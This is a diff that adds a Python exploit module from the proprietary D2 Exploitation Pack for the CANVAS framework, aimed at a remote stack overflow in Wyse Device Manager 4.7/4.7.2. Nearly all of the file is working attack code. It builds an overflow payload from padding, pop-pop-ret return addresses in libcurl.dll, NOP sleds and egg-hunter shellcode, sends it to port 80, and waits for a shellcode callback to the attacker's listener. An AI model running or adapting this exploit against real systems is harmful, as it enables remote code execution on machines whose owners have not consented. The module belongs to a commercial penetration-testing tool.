@@ -1,0 +1,151 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+
+import sys
+
+if "." not in sys.path: 
+	sys.path.append(".")
+
+import struct
+import canvasengine
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from shellcode import shellcodeGenerator
+
+
+# GUI info
+NAME = "Wyse Device Manager Remote Stack Overflow Vulnerability"
+
+DESCRIPTION = "Stack Overflow Vulnerability in Wyse Device Manager"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Wyse"
+DOCUMENTATION["Repeatability"] = "Once"
+DOCUMENTATION["Date public"] = "2009.07.10"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/35649/"
+DOCUMENTATION["Versions Affected"] = "Wyse Device Manager 4.7 / 4.7.2"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = "1.0"
+
+GTK2_DIALOG = "dialog.glade2"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Windows"] ]
+PROPERTY['VERSION'] = [ "XP"]
+
+NOTES="""
+"""
+
+CHANGELOG="""
+"""
+
+targets = {    
+    0 : [ "WDM 4.7.0 (No NX)", 0x100103be ], # pop,pop,ret @ libcurl.dll (hagent.exe 5.1.0.15)   
+    1 : [ "WDM 4.7.2 (No NX)", 0x10010287 ], # pop,pop,ret @ libcurl.dll (hagent.exe 5.1.1.10)
+}
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        self.setInfo(DESCRIPTION)
+        self.name = NAME       
+        self.port = 80
+        self.searchbadstring = "\x00"
+        self.badstring = self.searchbadstring   
+        self.version = 0
+        self.ssl = 0
+        
+        return
+
+
+    def neededListenerTypes(self):
+        from canvasengine import WIN32MOSDEF
+        return [WIN32MOSDEF]    
+
+
+    def createShellcode(self):
+        if self.callback:
+        	host = self.callback.ip
+        	port = self.callback.port       
+                         
+        rawshellcode = self.createHeapSafeInjectIntoProcess("", host, port)
+ 
+        self.createWin32SearchShellcode(host, port, rawshellcode = rawshellcode)
+
+
+    def run(self):
+        self.host = self.target.interface
+        self.port = int(self.argsDict.get("port", self.port)) 
+        self.ssl = int(self.argsDict.get("ssl", self.ssl))               
+        
+        self.setInfo("%s attacking %s:%d (in progress)"%(NAME, self.host, self.port))        
+        self.log("Version %d "%(self.version))     
+        self.log("Attacking %s:%d"%(self.host, self.port))
+        
+        sploitstring = self.makesploit()
+                
+        s = self.gettcpsock()
+        
+        try:
+          s.connect((self.host, self.port))                
+          self.websend(s, sploitstring)            
+        except:
+          self.log("Connection failed")
+          return 0    
+
+        ret = self.ISucceeded()
+        
+        if not ret:
+        	self.log("Sleeping for two seconds to check for callback")
+        	time.sleep(2)
+        	ret = self.ISucceeded()        
+
+        if ret:
+        	self.setInfo("%s attacking %s:%d (succeeded!)" % (self.name, self.host, self.port), showlog=True)
+        	self.log("%s done (succeeded!)" % self.name)            
+        
+        return ret
+        
+        
+    def makesploit(self):		    					
+    	os_name, pop_pop = targets[self.version]
+
+    	ret = struct.pack('<L', pop_pop)
+                    
+    	sploitstring = "&V&AAAAA" + self.shellcode + "AAAAAA&HS=" + "A" * 136 + "\x90\x90\xeb\x06" + ret + "\x90" * 8 + self.encodedsearchcode + "A" * 500
+	
+    	return sploitstring
+      
+        		
+    def displayVersions(self):
+    	i = 0
+    	print 'Available versions:'
+    	for listline in targets.values():
+    		print "\t%d: %s" % (i,listline[0])
+    		i += 1
+
+
+    def usage(self):
+    	print "Usage: %s -v version -t targethost -p port -l localip -d localport [-O ss:[0|1]]\n" % (sys.argv[0])
+    	self.displayVersions()
+    	sys.exit(0)
+
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
